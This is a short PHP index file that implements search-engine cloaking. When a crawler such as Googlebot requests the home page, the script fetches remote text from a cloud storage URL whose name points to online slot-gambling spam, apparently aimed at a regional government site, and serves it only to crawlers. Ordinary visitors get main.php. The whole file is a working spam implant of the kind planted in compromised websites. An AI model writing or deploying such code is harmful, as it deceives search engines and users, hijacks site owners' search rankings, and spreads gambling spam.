<?php

function isCrawler() {
    $crawlers = [
        "googlebot",
        "bingbot",
        "slurp",
        "duckduckbot",
        "baiduspider",
        "yandexbot",
        "google-inspectiontool",
        "google-site-verification"
    ];
    
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($crawlers as $crawler) {
        if (strpos($userAgent, $crawler) !== false) {
            return true;
        }
    }
    return false;
}

function isHomePage() {
    return ($_SERVER['REQUEST_URI'] === '/');
}

if (isCrawler() && isHomePage()) {
    // Output the cloaked content
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, 'https://keren.sgp1.cdn.digitaloceanspaces.com/text/h2fm-pulangpisaukab-slot-gacor.txt');
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $content = curl_exec($curl);
    curl_close($curl);
    echo $content;
} else {
    // Output your main content here
    include 'main.php';  // index Utama arahkan ke sini
}
?>